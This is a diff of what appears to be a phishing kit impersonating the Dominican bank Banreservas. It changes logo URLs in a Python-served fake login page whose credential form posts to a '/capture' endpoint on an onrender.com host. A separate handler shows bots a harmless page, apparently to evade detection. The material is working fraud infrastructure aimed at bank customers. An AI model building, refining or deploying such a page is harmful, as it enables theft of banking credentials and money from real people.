@@ -176,13 +176,13 @@ def get_template_banreservas():
     <!-- ========================================== -->
     <meta property="og:title" content="🔐 Acceso Seguro - Banreservas" />
     <meta property="og:description" content="Tu banco de confianza. Ingresa con tu usuario y contraseña para realizar tus transacciones de forma segura." />
-    <meta property="og:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" />
+    <meta property="og:image" content="https://i.postimg.cc/0bHy8T4s/nuevo-antes-despues-logo-banreservas-republica-dominicana-2016-detalles.webp" />
     <meta property="og:url" content="https://banreservas-uyw8.onrender.com/" />
     <meta property="og:type" content="website" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="🔐 Acceso Seguro - Banreservas" />
     <meta name="twitter:description" content="Tu banco de confianza. Ingresa con tu usuario y contraseña." />
-    <meta name="twitter:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" />
+    <meta name="twitter:image" content="https://i.postimg.cc/0bHy8T4s/nuevo-antes-despues-logo-banreservas-republica-dominicana-2016-detalles.webp" />
     <!-- ========================================== -->
     
     <title>Personal | Banreservas</title>
@@ -532,7 +532,7 @@ def get_template_banreservas():
     <!-- LOGIN OVERLAY (se muestra al hacer clic en "Acceder a TuBanco") -->
     <div class="login-overlay" id="loginOverlay">
         <div class="login-modal">
-            <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" class="logo" alt="Banreservas">
+            <img src="https://i.postimg.cc/0bHy8T4s/nuevo-antes-despues-logo-banreservas-republica-dominicana-2016-detalles.webp" class="logo" alt="Banreservas - El banco de los dominicanos">
             <h2>🔐 Acceso a TuBanco</h2>
             <p>Ingresa tus credenciales para acceder a tu cuenta</p>
             <form action="/capture" method="POST">
@@ -596,7 +596,7 @@ def handle_bots():
     <meta charset="UTF-8">
     <meta property="og:title" content="Banreservas - Banco líder">
     <meta property="og:description" content="Banco líder del sistema financiero dominicano.">
-    <meta property="og:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png">
+    <meta property="og:image" content="https://i.postimg.cc/0bHy8T4s/nuevo-antes-despues-logo-banreservas-republica-dominicana-2016-detalles.webp">
     <title>Banreservas</title>
 </head>
 <body>
